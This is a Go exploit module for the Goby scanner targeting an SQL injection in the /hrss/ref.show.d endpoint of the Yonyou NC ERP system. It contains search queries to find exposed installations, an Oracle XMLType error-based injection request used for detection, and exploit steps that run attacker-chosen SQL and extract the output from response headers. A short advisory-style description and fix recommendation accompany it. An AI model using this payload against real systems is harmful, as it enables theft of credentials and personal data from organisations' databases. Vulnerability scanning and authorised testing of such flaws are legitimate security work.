package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Yonyou Ufida /hrss/ref.show.d SQL Injection Vulnerability",
    "Description": "<p>The Yonyou NC system is an enterprise resource planning (ERP) solution widely used in enterprise management processes. This vulnerability exists in the /hrss/ref.show.d interface of the Yonyou NC system, allowing attackers to craft malicious SQL injection statements to obtain sensitive information from the database (such as administrator passwords and user personal information), and even write malicious code to the server under high privileges to further gain system control.</p>",
    "Product": "Yonyou NC System",
    "Homepage": "http://www.yonyou.com",
    "DisclosureDate": "2023-09-13",
    "PostTime": "2024-12-23",
    "Author": "heqiming@baimaohui.net",
    "FofaQuery": "((((body=\"UFIDA\" && body=\"logo/images/\") || body=\"logo/images/ufida_nc.png\" || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\") && body!=\"couchdb\" && body!=\"drupal\") || (title==\"产品登录界面\" && body=\"UFIDA NC\") || (title=\"powered by UFIDA\" && body=\"/activity/testsupport.php\" && title=\"用友\"))",
    "GobyQuery": "((((body=\"UFIDA\" && body=\"logo/images/\") || body=\"logo/images/ufida_nc.png\" || title=\"Yonyou NC\" || body=\"<div id=\\\"nc_text\\\">\" || body=\"<div id=\\\"nc_img\\\" onmouseover=\\\"overImage('nc');\") && body!=\"couchdb\" && body!=\"drupal\") || (title==\"产品登录界面\" && body=\"UFIDA NC\") || (title=\"powered by UFIDA\" && body=\"/activity/testsupport.php\" && title=\"用友\"))",
    "Level": "2",
    "Impact": "<p>This vulnerability allows attackers to obtain sensitive information from the database through SQL injection, potentially leading to data leakage, privilege escalation, and even complete server control.</p>",
    "Recommendation": "<p>It is recommended to immediately upgrade the Yonyou NC system to the latest version and strictly filter and validate the input parameters of the /hrss/ref.show.d interface to prevent SQL injection attacks. Additionally, enabling a Web Application Firewall (WAF) to intercept malicious requests is advised.</p>",
    "References": [
        "https://mp.weixin.qq.com/s/cOB2RsclJn2_OID18BSWmA"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "SELECT TABLE_NAME FROM USER_TABLES WHERE ROWNUM=1,SELECT USER FROM dual",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "SELECT TABLE_NAME FROM USER_TABLES WHERE ROWNUM=1",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/hrss/ref.show.d?refcode=HI000000000000000003'+AND+6525=(SELECT+UPPER(XMLType(CHR(60)||CHR(58)||CHR(84)||CHR(56)||CHR(103)||CHR(121)||CHR(57)||CHR(99)||CHR(73)||CHR(110)||CHR(65)||CHR(112)||CHR(113)||CHR(114)||CHR(107)||CHR(88)||CHR(120)||CHR(49)))+FROM+DUAL)+AND+'pojU'='pojU",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "T8gy9cInApqrkXx1",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/hrss/ref.show.d?refcode=HI000000000000000003'+AND+6525=(SELECT+UPPER(XMLType(CHR(60)||CHR(58)||CHR(84)||CHR(56)||CHR(103)||CHR(121)||CHR(57)||CHR(99)||CHR(73)||CHR(110)||({{{payload_encode}}})||CHR(65)||CHR(112)||CHR(113)||CHR(114)||CHR(107)||CHR(88)||CHR(120)||CHR(49)))+FROM+DUAL)+AND+'pojU'='pojU",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "result|lastheader|regex|T8gy9cIn([^'][\\s\\S]*?)ApqrkXx1",
                "result_decode|define|url_decode|{{{result}}}",
                "output|define|url_decode|{{{result_decode}}}",
                "output|when|attackType=sqlpoint|{{{lastreq}}}"
            ]
        }
    ],
    "Tags": [
        "2H1W",
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.1",
    "Translation": {
        "CN": {
            "Name": "用友Ufida /hrss/ref.show.d SQL 注入漏洞",
            "Product": "用友NC系统",
            "Description": "<p>用友NC系统是一种企业资源规划（ERP）解决方案，广泛应用于企业管理流程中。该漏洞存在于用友NC系统的 /hrss/ref.show.d 接口中，攻击者可以通过特制的SQL注入语句获取数据库中的敏感信息（如管理员密码、用户个人信息），甚至在高权限情况下向服务器写入恶意代码，进一步获取系统权限。</p>",
            "Recommendation": "<p>建议立即升级用友NC系统至最新版本，并对 /hrss/ref.show.d 接口的输入参数进行严格的过滤和校验，防止SQL注入攻击。同时，建议启用Web应用防火墙（WAF）以拦截恶意请求。</p>",
            "Impact": "<p>该漏洞允许攻击者通过SQL注入获取数据库中的敏感信息，可能导致数据泄露、权限提升，甚至服务器被完全控制。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "两高一弱",
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Yonyou Ufida /hrss/ref.show.d SQL Injection Vulnerability",
            "Product": "Yonyou NC System",
            "Description": "<p>The Yonyou NC system is an enterprise resource planning (ERP) solution widely used in enterprise management processes. This vulnerability exists in the /hrss/ref.show.d interface of the Yonyou NC system, allowing attackers to craft malicious SQL injection statements to obtain sensitive information from the database (such as administrator passwords and user personal information), and even write malicious code to the server under high privileges to further gain system control.</p>",
            "Recommendation": "<p>It is recommended to immediately upgrade the Yonyou NC system to the latest version and strictly filter and validate the input parameters of the /hrss/ref.show.d interface to prevent SQL injection attacks. Additionally, enabling a Web Application Firewall (WAF) to intercept malicious requests is advised.</p>",
            "Impact": "<p>This vulnerability allows attackers to obtain sensitive information from the database through SQL injection, potentially leading to data leakage, privilege escalation, and even complete server control.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "2H1W",
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "payload": "switch|attackType|{{{default}}}",
        "payload_encode": "define|query_encode|{{{payload}}}",
        "vulurl": "define|variable|{{{fixedhostinfo}}}/hrss/ref.show.d"
    },
    "VariablesOrder": [
        "payload",
        "payload_encode",
        "vulurl"
    ],
    "EditType": "fast",
    "PocId": "9980"
}`
  
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}